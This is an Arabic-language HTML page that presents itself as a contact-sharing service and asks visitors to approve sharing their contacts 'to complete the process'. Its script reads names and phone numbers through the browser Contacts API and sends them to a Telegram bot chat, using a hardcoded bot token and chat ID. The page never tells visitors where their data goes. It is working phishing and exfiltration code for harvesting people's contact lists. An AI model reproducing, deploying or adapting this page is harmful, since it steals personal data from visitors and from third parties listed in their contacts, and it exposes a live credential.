<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خدمة المشاركة</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
        }
        button:hover {
            background-color: #006699;
        }
        #status {
            margin-top: 20px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>مشاركة جهات الاتصال</h1>
        <p>الرجاء الموافقة على مشاركة جهات الاتصال لاستكمال العملية</p>
        <button id="shareBtn">مشاركة جهات الاتصال</button>
        <div id="status"></div>
    </div>

    <script>
        document.getElementById('shareBtn').addEventListener('click', async function() {
            const statusElement = document.getElementById('status');
            
            // التحقق من دعم واجهة Contacts API
            if (!('contacts' in navigator && 'select' in navigator.contacts)) {
                statusElement.innerHTML = 'عذرًا، متصفحك لا يدعم مشاركة جهات الاتصال.';
                return;
            }
            
            try {
                statusElement.innerHTML = 'جاري جلب جهات الاتصال...';
                
                // طلب الإذن للوصول إلى جهات الاتصال
                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
                
                if (contacts.length === 0) {
                    statusElement.innerHTML = 'لم يتم اختيار أي جهات اتصال.';
                    return;
                }
                
                statusElement.innerHTML = `تم جلب ${contacts.length} جهة اتصال، جاري الإرسال...`;
                
                // استخراج أرقام الهاتف
                const phoneNumbers = [];
                contacts.forEach(contact => {
                    if (contact.tel && contact.tel.length > 0) {
                        contact.tel.forEach(phone => {
                            phoneNumbers.push({
                                name: contact.name ? contact.name.join(' ') : 'غير معروف',
                                number: phone
                            });
                        });
                    }
                });
                
                // إرسال البيانات إلى بوت تلجرام (استبدل YOUR_BOT_TOKEN و YOUR_CHAT_ID بالقيم الفعلية)
                const botToken = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
                const chatId = '7327464581';
                const message = `أرقام الهاتف المجمعة:\n\n${phoneNumbers.map(p => `${p.name}: ${p.number}`).join('\n')}`;
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    statusElement.innerHTML = 'تم إرسال جهات الاتصال بنجاح!';
                } else {
                    statusElement.innerHTML = 'حدث خطأ أثناء الإرسال.';
                }
            } catch (error) {
                statusElement.innerHTML = `حدث خطأ: ${error.message}`;
                console.error(error);
            }
        });
    </script>
</body>
</html>
